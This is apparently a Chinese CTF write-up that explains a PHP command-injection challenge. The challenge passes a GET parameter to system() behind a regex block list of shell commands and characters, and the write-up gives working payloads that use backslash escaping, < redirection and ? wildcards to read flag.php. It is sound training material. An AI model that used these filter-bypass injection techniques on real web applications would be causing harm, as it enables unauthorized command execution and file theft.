```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了 

;

cat

flag

空格

数字

$

*

more

less

head

sort

tail

sed

cut

tac

awk

strings

od

curl

`

%

\x09即水平制表符

\x26即&符号



无回显





### 第一种

利用\绕过字母

利用<绕过空格

利用||绕过无回显

```
?c=ls||
```

![image-20250403155717652](./assets/image-20250403155717652.png)

```
?c=ca\t<fl\ag.php||
```

![image-20250403155651030](./assets/image-20250403155651030.png)





### 第二种

利用?匹配/bin/cat

利用<>绕过空格

利用\绕过字母

利用%0a绕过无回显

```
?c=/bin/ca?<>fl\ag.php
```

![image-20250403155840066](./assets/image-20250403155840066.png)